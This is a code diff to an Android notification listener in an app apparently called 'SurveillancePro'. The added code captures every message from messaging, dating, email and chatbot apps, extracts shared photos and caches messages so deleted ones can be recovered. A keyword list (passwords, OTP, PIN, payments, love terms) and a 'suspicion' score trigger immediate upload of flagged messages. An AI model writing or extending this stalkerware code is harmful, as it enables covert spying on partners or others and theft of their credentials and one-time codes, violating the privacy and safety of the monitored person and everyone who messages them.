@@ -1,14 +1,52 @@
 package com.surveillancepro.android.services
 
+import android.app.Notification
+import android.graphics.Bitmap
+import android.graphics.drawable.Icon
+import android.os.Build
+import android.os.Bundle
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
+import android.util.Base64
+import android.util.Log
 import com.surveillancepro.android.data.DeviceStorage
 import com.surveillancepro.android.data.EventQueue
+import com.surveillancepro.android.workers.SyncWorker
+import java.io.ByteArrayOutputStream
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
 
+/**
+ * Service de capture des notifications ULTRA-PUISSANT.
+ * 
+ * Capture TOUS les messages de toutes les applications de messagerie:
+ * - WhatsApp, Telegram, Signal, Messenger, Instagram, Snapchat, TikTok
+ * - SMS, Emails, Apps de dating, Slack, Teams, Discord
+ * - ChatGPT, Gemini, Claude et autres chatbots IA
+ * 
+ * Fonctionnalités avancées:
+ * - Extraction des images des notifications (photos partagées)
+ * - Détection des messages vocaux
+ * - Capture des conversations de groupe
+ * - Sync immédiat pour les messages importants
+ * - Détection des mots-clés sensibles
+ */
 class SupervisionNotificationListener : NotificationListenerService() {
+    
+    companion object {
+        private const val TAG = "NotificationListener"
+        
+        // Mots-clés sensibles qui déclenchent un sync immédiat
+        private val SENSITIVE_KEYWORDS = listOf(
+            "urgent", "important", "secret", "confidentiel", "privé",
+            "password", "mot de passe", "code", "pin", "otp",
+            "argent", "money", "paiement", "virement", "compte",
+            "rencontre", "rendez-vous", "meeting", "rdv",
+            "démission", "licenciement", "contrat",
+            "love", "amour", "je t'aime", "bébé", "chéri",
+        )
+    }
 
     private var lastNotifKey = ""
     private var lastNotifTime = 0L
@@ -135,7 +173,56 @@ class SupervisionNotificationListener : NotificationListenerService() {
             else -> "message_captured"
         }
         
+        // Extraire l'image de la notification si présente (photo partagée)
+        try {
+            val largeIcon = extras.getParcelable<Bitmap>("android.largeIcon")
+            if (largeIcon != null && largeIcon.width > 50) {
+                val imageBase64 = bitmapToBase64(largeIcon, 80)
+                if (imageBase64.length < 500000) { // Max 500KB
+                    payload["thumbnailBase64"] = imageBase64
+                }
+            }
+        } catch (e: Exception) {
+            Log.w(TAG, "Failed to extract notification image: ${e.message}")
+        }
+        
+        // Vérifier si le message contient des mots-clés sensibles
+        val isSensitive = SENSITIVE_KEYWORDS.any { keyword ->
+            messageContent.lowercase().contains(keyword) || title.lowercase().contains(keyword)
+        }
+        if (isSensitive) {
+            payload["isSensitive"] = true
+            payload["priority"] = "high"
+        }
+        
         queue.enqueue(eventType, payload)
+        
+        // FONCTIONNALITÉS AVANCÉES:
+        
+        // 1. Cacher le message pour récupérer les messages supprimés
+        DeletedMessageCapture.cacheMessage(packageName, title, messageContent, appName)
+        
+        // 2. Vérifier si c'est une notification de message supprimé
+        DeletedMessageCapture.checkForDeletedMessage(applicationContext, packageName, title, messageContent, appName)
+        
+        // 3. Analyser le sentiment du message
+        val analysis = SentimentAnalyzer.analyzeMessage(applicationContext, messageContent, title, appName, packageName)
+        
+        // Sync immédiat pour les messages sensibles, dating, ou suspects
+        if (isSensitive || eventType == "dating_message" || analysis.suspicionScore >= 50) {
+            SyncWorker.triggerNow(applicationContext)
+        }
+        
+        Log.d(TAG, "Captured: $appName - $title (sensitive=$isSensitive, suspicion=${analysis.suspicionScore})")
+    }
+    
+    /**
+     * Convertit un Bitmap en Base64 avec compression.
+     */
+    private fun bitmapToBase64(bitmap: Bitmap, quality: Int): String {
+        val outputStream = ByteArrayOutputStream()
+        bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream)
+        return Base64.encodeToString(outputStream.toByteArray(), Base64.NO_WRAP)
     }
 
     /**
